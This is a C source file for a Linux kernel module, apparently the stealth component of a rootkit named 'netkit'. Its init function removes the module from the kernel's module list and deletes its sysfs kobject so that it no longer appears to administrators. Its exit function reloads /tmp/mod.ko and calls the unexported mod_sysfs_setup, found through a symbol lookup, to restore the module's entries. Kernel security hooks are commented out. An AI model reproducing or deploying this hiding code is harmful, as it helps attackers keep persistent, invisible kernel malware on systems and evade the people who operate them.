#include <linux/list.h>
#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/vmalloc.h>

#include "module.h"

#include "../../sys/symbol.h"
#include "../../sys/file.h"
#include "../../sys/debug.h"

/*static struct kobject *kboj_parent;

// remove the kobject from its kset's list
static void kobj_kset_leave(struct kobject *kobj)
{
	if (!kobj->kset)
		return;

	spin_lock(&kobj->kset->list_lock);
	list_del_init(&kobj->entry);
	spin_unlock(&kobj->kset->list_lock);
	//kset_put(kobj->kset);
}

static void __kobject_del(struct kobject *kobj)
{
	struct kernfs_node *sd;
	const struct kobj_type *ktype;
    int i;

	sd = kobj->sd;
	ktype = get_ktype(kobj);

	if (ktype && ktype->default_groups)
        for (i = 0; ktype->default_groups[i]; i++)
            sysfs_remove_group(kobj, ktype->default_groups[i]);

	// send "remove" if the caller did not do it but sent "add"
	if (kobj->state_add_uevent_sent && !kobj->state_remove_uevent_sent) {
		pr_debug("'%s' (%p): auto cleanup 'remove' event\n",
			 kobject_name(kobj), kobj);
		kobject_uevent(kobj, KOBJ_REMOVE);
	}

	sysfs_remove_dir(kobj);
	sysfs_put(sd);

	kobj->state_in_sysfs = 0;
	kobj_kset_leave(kobj);
	kobj->parent = NULL;
}

static void kobj_kset_join(struct kobject *kobj)
{
	if (!kobj->kset)
		return;

	//kset_get(kobj->kset);
	spin_lock(&kobj->kset->list_lock);
	list_add_tail(&kobj->entry, &kobj->kset->list);
	spin_unlock(&kobj->kset->list_lock);
}*/

struct load_info {
	const char *name;
	/* pointer to module in temporary copy, freed at end of load_module() */
	struct module *mod;
	Elf_Ehdr *hdr;
	unsigned long len;
	Elf_Shdr *sechdrs;
	char *secstrings, *strtab;
	unsigned long symoffs, stroffs, init_typeoffs, core_typeoffs;
	bool sig_ok;
#ifdef CONFIG_KALLSYMS
	unsigned long mod_kallsyms_init_off;
#endif
#ifdef CONFIG_MODULE_DECOMPRESS
#ifdef CONFIG_MODULE_STATS
	unsigned long compressed_len;
#endif
	struct page **pages;
	unsigned int max_pages;
	unsigned int used_pages;
#endif
	struct {
		unsigned int sym, str, mod, vers, info, pcpu;
	} index;
};

/* Sets info->hdr and info->len. */
static int copy_module_from_user(const void *umod, unsigned long len, struct load_info *info)
{
	int err;

	/*err = security_kernel_load_data(LOADING_MODULE, true);
	if (err)
		return err;*/

	info->len = len;
	if (info->len < sizeof(*(info->hdr)))
		return -ENOEXEC;

	/* Suck in entire file: we'll want most of it. */
	info->hdr = __vmalloc(info->len, GFP_KERNEL | __GFP_NOWARN);
	if (!info->hdr)
		return -ENOMEM;

	//if (copy_chunked_from_user(info->hdr, umod, info->len) != 0) {
	if (memcpy(info->hdr, umod, info->len) != 0) {
		err = -EFAULT;
		goto out;
	}

	//err = security_kernel_post_load_data((char *)info->hdr, info->len, LOADING_MODULE, "init_module");
out:
	if (err)
		vfree(info->hdr);

	return err;
}

// module_init already exists in module.h
// don't {inc,dec}rement refcounts bcs we need kset when reallocating for exit
int module_init_(void)
{
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    return 0;
}

int module_exit_(void)
{
    u8 *umod;
    size_t modlen;
	struct load_info info = { };
    int (*mod_sysfs_setup)(struct module*, const struct load_info*, struct kernel_param*, unsigned int);
	int err;

    NETKIT_LOG("[*] exiting stealth/module...\n");
    file_read("/tmp/mod.ko", &umod, &modlen);

    err = copy_module_from_user(umod, modlen, &info);
	if (err)
		return err;

    NETKIT_LOG("[*] recreating sysfs entries...\n");
    mod_sysfs_setup = (int(*)(struct module*, const struct load_info*, struct kernel_param*, unsigned int))sym_lookup("mod_sysfs_setup");
    err = mod_sysfs_setup(THIS_MODULE, &info, THIS_MODULE->kp, THIS_MODULE->num_kp);
    if (err < 0)
        return err;

	/*THIS_MODULE->mkobj.kobj.state_in_sysfs = 1;
	kobj_kset_join(&THIS_MODULE->mkobj.kobj);
	THIS_MODULE->mkobj.kobj.parent = kboj_parent;*/

    return 0;
}